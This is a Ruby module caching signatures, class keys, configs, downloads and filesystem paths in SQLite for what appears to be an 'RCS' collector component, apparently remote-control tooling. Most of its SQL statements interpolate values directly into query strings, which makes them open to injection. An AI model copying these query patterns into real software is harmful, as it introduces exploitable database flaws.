#
#  Cache management for the db
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'sqlite3'

module RCS
module Collector

class Cache
  extend RCS::Tracer

  CACHE_FILE = Dir.pwd + '/config/cache.db'

  def self.create!
    begin
      db = SQLite3::Database.new CACHE_FILE
    rescue Exception => e
      trace :error, "Problems creating the cache file: #{e.message}"
    end

    # the schema
    schema = ["CREATE TABLE signature (signature CHAR(32))",
              "CREATE TABLE class_keys (id CHAR(16), key CHAR(32))",
              "CREATE TABLE configs (bid INT, cid INT, config BLOB)",
              "CREATE TABLE downloads (bid INT, did INT, filename TEXT)",
              "CREATE TABLE filesystems (bid INT, fid INT, depth INT, path TEXT)"
             ]

    # create all the tables
    schema.each do |query|
      begin
        db.execute query
      rescue Exception => e
        trace :error, "Cannot execute the statement : #{e.message}"
      end
    end
    
    db.close
  end

  private_class_method :create!

  # completely wipe out the cache file
  def self.destroy!
    File.delete(CACHE_FILE) if File.exist?(CACHE_FILE)
  end

  def self.empty!
    destroy!
    create!
  end

  def self.length
    return 0 unless File.exist?(CACHE_FILE)

    count = 0
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT COUNT(*) FROM class_keys;") do |row|
        count = row.first
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return count
  end

  ##############################################
  # SIGNATURE
  ##############################################

  def self.signature=(sig)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM signature;")
      db.execute("INSERT INTO signature VALUES ('#{sig}');")
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.signature
    return nil unless File.exist?(CACHE_FILE)

    # default value
    signature = nil

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT signature FROM signature;") do |row|
        signature = row.first
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return signature
  end

  ##############################################
  # CLASS KEYS
  ##############################################

  def self.add_class_keys(class_keys)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      class_keys.each_pair do |key, value|
        db.execute("INSERT INTO class_keys VALUES ('#{key}','#{value}');")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.class_keys
    return {} unless File.exist?(CACHE_FILE)

    class_keys = {}
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT * FROM class_keys;") do |row|
        class_keys[row[0]] = row[1]
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return class_keys
  end

  ##############################################
  # CONFIG
  ##############################################

  def self.new_conf?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT cid FROM configs WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end
    
    return (ret.empty?) ? false : true
  end

  def self.new_conf(bid)
    return 0, nil unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT cid, config FROM configs WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    # return the first row (cid, config)
    return *ret.first
  end

  def self.save_conf(bid, cid, config)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)
    
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("INSERT INTO configs VALUES (#{bid}, #{cid}, ? )", SQLite3::Blob.new(config))
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_conf(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM configs WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  ##############################################
  # UPLOADS
  ##############################################

  def self.new_uploads?(bid)
    #TODO: implement
  end

  def self.new_uploads(bid)
    #TODO: implement
  end

  def self.save_uploads(bid, uploads)
    #TODO: implement
  end

  def self.del_uploads(bid)
    #TODO: implement
  end

  ##############################################
  # DOWNLOADS
  ##############################################

  def self.new_downloads?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT did FROM downloads WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_downloads(bid)
    return {} unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT did, filename FROM downloads WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    downloads = {}
    # parse the results
    ret.each do |elem|
      downloads[elem[0]] = elem[1]
    end
    return downloads
  end

  def self.save_downloads(bid, downloads)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      downloads.each_pair do |key, value|
        db.execute("INSERT INTO downloads VALUES (#{bid}, #{key}, '#{value}' )")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_downloads(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM downloads WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  ##############################################
  # FILESYSTEM
  ##############################################

  def self.new_filesystems?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT fid FROM filesystems WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_filesystems(bid)
    return {} unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT fid, depth, path FROM filesystems WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    filesystems = {}
    # parse the results
    ret.each do |elem|
      filesystems[elem[0]] = {:depth => elem[1], :path => elem[2]}
    end
    return filesystems
  end

  def self.save_filesystems(bid, filesystems)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      filesystems.each_pair do |key, value|
        db.execute("INSERT INTO filesystems VALUES (#{bid}, #{key}, #{value[:depth]}, '#{value[:path]}' )")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_filesystems(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM filesystems WHERE bid = #{bid};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

end #Cache

end #Collector::
end #RCS::